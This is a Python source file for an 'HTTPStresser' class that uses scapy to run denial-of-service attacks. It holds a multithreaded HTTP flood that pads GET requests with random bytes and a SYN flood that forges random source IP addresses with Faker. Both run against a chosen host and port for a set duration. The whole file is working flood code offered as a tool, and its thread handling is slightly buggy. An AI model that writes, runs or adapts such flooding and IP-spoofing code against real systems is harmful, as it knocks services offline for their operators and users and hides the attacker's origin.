from Stresser import Stresser
from scapy.all import *
from faker import Faker  
import threading
from datetime import datetime



class HTTPStresser(Stresser):
    def __init__(self, duration:int, threads:int, method:str) -> None:
        methods = ['GET','POST']
        super().__init__(duration, threads)
        assert method in methods, "Only method GET and POST supported" 
        self.method = method
        
    def send_packet(self, host_dst:str, dst_port:int):
        """
        Reference : https://stackoverflow.com/questions/4750793/python-scapy-or-the-like-how-can-i-create-an-http-get-request-at-the-packet-leve
        """

        faker = Faker()  
        fake_ip = faker.ipv4()
        print(fake_ip)
        load_layer("http")
        syn = IP(dst=host_dst) / TCP(dport=dst_port, flags='S')
        # sr1(syn) is the SYN-ACK packet received by the server
        syn_ack = sr1(syn)
        tick = datetime.now()
        while True:
            tock = datetime.now()
            diff = tock - tick    # the result is a datetime.timedelta object
            if diff.total_seconds() > self.duration :
                break 
            getStr = 'GET / HTTP/1.1\r\nHost: '+host_dst+'\r\n\r\n'
            request = IP(dst=host_dst) / TCP(dport=dst_port, sport=syn_ack[TCP].dport,
                seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A') / getStr
            
            request = request / Raw(RandString(1500-(len(request))))
            print(len(request))
            reply = sr1(request)
            self.packet_sent += 1
    
    def syn_flooder(self,host_dst:str, dst_port:int):
        """
        Ref: https://www.thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python
        https://www.youtube.com/watch?v=VgwASWaksJE
        """
        load_layer("http")
        
        tick = datetime.now()
        while True :
            tock = datetime.now()
            diff = tock - tick
            if diff.total_seconds() > self.duration :
                break 
            faker = Faker()  
            fake_ip = faker.ipv4()
            syn = IP(src=fake_ip,dst=host_dst) / TCP(dport=dst_port, flags='S')
            syn = syn / Raw(RandString(1500-(len(syn))))
            send(syn,verbose=2)

    def get_method(self):
        return self.method

    def attack(self, host_dst, dst_port):
        
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(target=self.send_packet, args=(host_dst,dst_port))
            thread.start()
        threads.append(thread)

        #wait for all threads to complete before main program exits 
        for thread in threads:
            thread.join()
        
